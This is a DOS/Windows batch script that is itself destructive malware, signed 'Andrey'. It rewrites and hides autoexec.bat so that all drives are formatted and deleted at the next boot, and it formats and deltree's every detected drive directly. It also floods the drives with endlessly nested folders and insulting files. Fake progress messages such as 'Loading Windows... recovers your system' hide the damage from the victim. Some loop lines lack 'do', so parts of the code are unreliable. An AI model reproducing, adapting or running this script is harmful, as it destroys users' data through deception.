@echo off
:start
cls
echo PLEASE WAIT . . .
call attrib -r -h c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo call format c: /q /u /autotest >nul >>c:\autoexec.bat
call attrib +r +h c:\autoexec.bat >nul
set drive=
set alldrive=c d e f g h i j k l m n o p q r s t u v w x y z
echo @echo off >drivechk.bat
echo @prompt %%%%comspec%%%% /f /c vol %%%%1: $b find "Vol" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 goto enddc >>drivechk.bat
cls
echo PLEASE WAIT . . .
echo @prompt %%%%comspec%%%% /f /c dir %%%%1:.\/ad/w/-p $b find "bytes" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 goto enddc >>drivechk.bat
cls
echo PLEASE WAIT PROGRAM LOADS . . .
echo @prompt dir %%%%1:.\/ad/w/-p $b find " 0 bytes free" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 set drive=%%drive%% %%1 >>drivechk.bat
cls
echo PLEASE WAIT . . .
echo :enddc >>drivechk.bat
:testdrv
for %%a in (%alldrive%) do call drivechk.bat %%a >nul
del drivechk.bat >nul
:form_del
call attrib -r -h c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autotest >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a Bunga >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) call deltree /y %%%%a:\ >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autotest >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a Bunga >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) call deltree /y %%%%a:\ >nul >>c:\autoexec.bat
echo cd\ >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo I love this WORD !!MAZA FAKA!!
echo echo. >>c:\autoexec.bat
echo echo Regards, >>c:\autoexec.bat
echo echo. >>c:\autoexec.bat
echo echo MAZA FAKA >>c:\autoexec.bat
call attrib +r +h c:\autoexec.bat
:makedir
if exist c:\temp.bat attrib -r -h c:\temp.bat >nul
echo @echo off >c:\temp.bat
echo %%1:\ >>c:\temp.bat
echo cd\ >>c:\temp.bat
echo :startmd >>c:\temp.bat
echo for %%%%a in ("if not exist %%2\nul md %%2" "if exist %%2\nul cd %%2") do %%%%a >>c:\temp.bat
echo for %%%%a in (">ass_hole.txt") do echo %%%%a Your Gone @$$hole!!!! >>c:\temp.bat
echo if not exist %%1:\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\nul goto startmd >>c:\temp.bat 
call attrib +r +h c:\temp.bat >nul
cls
echo Initializing Variables . . .
rem deltree /y %%a:\*. only eliminates directories, hence leaving the file created above for further destruction.
for %%a in (%drive%) do call format %%a: /q /u /autotest >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
for %%a in (%drive%) do call c:\temp.bat %%a Munga >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
echo Analyzing System Structure . . .
for %%a in (%drive%) call attrib -r -h %%a:\ /S  >nul
call attrib +r +h c:\temp.bat >nul
call attrib +r +h c:\autoexec.bat >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
echo Analyzing System Structure . . .
echo Initializing Application . . .
for %%a in (%drive%) call deltree /y %%a:\*. >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
echo Analyzing System Structure . . .
echo Initializing Application . . .
echo Starting Application . . .
for %%a in (%drive%) do call c:\temp.bat %%a Munga >nul
cls
echo Thank you for using a <<<ANDREY>>> product.
echo.
echo                BUM-BUM,MAZA FAKA!
echo.
echo    Strike in the monitor for continuation of loading.
echo.
echo     HELP MY! HELP MY! HAHAHAHAHA MAZA FAKA
echo.
echo     <<<<<<<<<<<<<<<<<2000>>>>>>>>>>>>>>>>>
echo.
echo         Andrey<<<KHANTY-MANSIYSK>>>Master
:end
